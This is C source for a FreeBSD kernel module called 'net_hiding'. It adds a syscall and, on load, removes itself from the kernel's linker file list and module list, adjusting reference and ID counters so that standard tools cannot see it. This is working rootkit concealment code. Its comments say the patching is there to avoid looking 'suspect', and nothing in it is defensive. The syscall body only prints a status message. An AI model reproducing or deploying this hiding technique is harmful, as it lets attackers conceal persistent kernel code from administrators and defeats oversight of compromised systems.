#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/linker.h>
#include <sys/sysproto.h>
#include <sys/proc.h>
#include <sys/syscall.h>
#include <sys/file.h>
#include <sys/malloc.h>
#include <sys/lock.h>
#include <sys/lockmgr.h>
#include <sys/mutex.h>

/* function prototypes (MOVE TO HEADER) */
static int net_hiding(struct thread *, void *);
static void print_status(void);

typedef TAILQ_HEAD(, module) modulelist_t;

extern linker_file_list_t linker_files;	/* patch the linker_files list */
extern int next_file_id;
extern modulelist_t modules;		/* patch the module list */
extern int nextid;

struct module {
	TAILQ_ENTRY(module) link;
	TAILQ_ENTRY(module) flink;
	struct linker_file *file;
	int refs;
	int id;
	char *name;
	modeventhand_t handler;
	void *arg;
	modspecific_t data;
};

char string[] = "net_hiding module.";

/* this is only to show that the extern functions are working */
static void print_status() {
	uprintf("IT WORKS : %s\n", string);
}

/* This function only checks that the module is still working. */
static int net_hiding(struct thread *t, void *arg) {
	uprintf("SYSCALL was ESTABLISHED and is still in memory.\n");
	print_status();
	return 0;
}

/* The 'sysent' for the new syscall */
static struct sysent net_hiding_sysent = {
	0,		/* sy_narg */
	net_hiding /* sy_call */
};

/* The offset in sysent where the syscall is allocated. */
static int offset = NO_SYSCALL;	/* NO_SYSCALL = 'let the kernel decide' */

/* This function is called at load/unload */
static int event_handler(struct module *module, int event, void *arg) {
	int e = 0; /* Error, 0 for normal return status */
	linker_file_t lf = 0;
	module_t mod = 0;

	switch (event) {
		case MOD_LOAD:
			uprintf("The module has been loaded!\n");
			
			/* NOTE: The first linker file is the current kernel image (/kernel for example).
			   		 If we load our module we will increase the reference count of the kernel
					 link file. This might be a but suspect, so we must patch this. */

			(&linker_files)->tqh_first->refs--;
			for (lf = (&linker_files)->tqh_first; lf; lf = (lf)->link.tqe_next) {
				if (!strcmp(lf->filename, "net_hiding.ko")) {
					next_file_id--; /* decrement the global link file counter */

					/* remove the entry */
					if (((lf)->link.tqe_next) != NULL)
						(lf)->link.tqe_next->link.tqe_prev = (lf)->link.tqe_prev;
					else
						(&linker_files)->tqh_last = (lf)->link.tqe_prev;

					*(lf)->link.tqe_prev = (lf)->link.tqe_next;

					break;
				}
			}

			for (mod = TAILQ_FIRST(&modules); mod; mod = TAILQ_NEXT(mod, link)) {
				if (!strcmp(mod->name, "net_hiding")) {
					/* patch the internel ID counter */
					nextid--;

					TAILQ_REMOVE(&modules, mod, link);
				}
			}

			break;
		case MOD_UNLOAD:
			uprintf("The module has been unloaded.\n");
			break;
		default:
			e = EOPNOTSUPP; /* Error, operation not supported */
			break;
	}

	return(e);
}

SYSCALL_MODULE(net_hiding, &offset, &net_hiding_sysent, event_handler, NULL);
